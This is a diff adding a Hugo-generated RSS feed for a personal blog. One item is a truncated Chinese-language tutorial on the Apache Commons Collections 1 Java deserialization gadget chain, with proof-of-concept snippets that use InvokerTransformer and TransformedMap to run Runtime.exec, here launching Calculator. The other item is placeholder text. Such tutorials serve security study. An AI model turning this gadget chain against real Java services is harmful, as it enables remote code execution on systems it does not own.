@@ -1,0 +1,28 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+  <channel>
+    <title>My Hugo FixIt Site</title>
+    <link>https://nlrvana.github.io/</link>
+    <description>My Hugo FixIt Site</description>
+    <generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 14 Jan 2024 22:46:46 &#43;0800</lastBuildDate>
+      <atom:link href="https://nlrvana.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+  <title>Test</title>
+  <link>https://nlrvana.github.io/posts/b128b76/</link>
+  <pubDate>Sun, 14 Jan 2024 22:46:46 &#43;0800</pubDate>
+  <author>Author</author>
+  <guid>https://nlrvana.github.io/posts/b128b76/</guid>
+  <description><![CDATA[CommonsCollections1链详解jdk8源码下载 https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 漏洞触发点在org.apache.commons.collections.functors.InvokerTransformer 其中的transform()方法 很明显的一个反射调用，其中iMethodName、iParamTypes、iArgs都是可控的变量，便可以调用任意方法和任意参数 看一下构造器是如何赋值的 构造一个简单的 payload 试试 new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;}).transform(Runtime.getRuntime()); `` 找一个任意类调用transforms()方法的方法，这里选择org.apache.commons.collections.map.TransformedMap类的checkSetValue()方法
+valueTransformer变量可控 但是因为构造器是protected修饰，所以无法直接调用，利用这里的静态方法decorate()进行了调用 再查看一下哪里调用了checkSetValue()方法，只有这一处 setValue()方法调用了checkSetValue()，构造一个payload，看看能不能通
+1 2 3 4 5 6 7 8 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;}); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&#34;key&#34;,&#34;value&#34;); Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer); for(Map.Entry entry:transformedMap.entrySet()){ entry.setValue(r); 接着找一个setValue()方法的调用，在sun.reflect.annotation.AnnotationInvocationHandler类中，找到了如下方法 这里调用了setValue()方法，并且还在readObject()方法中，继续构造poc
+1 2 3 4 5 6 7 8 9 10 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String.]]></description>
+</item>
+<item>
+  <title>My First Post</title>
+  <link>https://nlrvana.github.io/posts/first_post/</link>
+  <pubDate>Mon, 20 Feb 2023 20:14:22 &#43;0800</pubDate>
+  <author>Author</author>
+  <guid>https://nlrvana.github.io/posts/first_post/</guid>
+  <description><![CDATA[A blog (a truncation of &ldquo;weblog&rdquo;) is an informational website published on the World Wide Web consisting of discrete, often informal diary-style text entries (posts). Posts are typically displayed in reverse chronological order so that the most recent post appears first, at the top of the web page. Until 2009, blogs were usually the work of a single individual,[citation needed] occasionally of a small group, and often covered a single subject or topic.]]></description>
+</item>
+</channel>
+</rss>
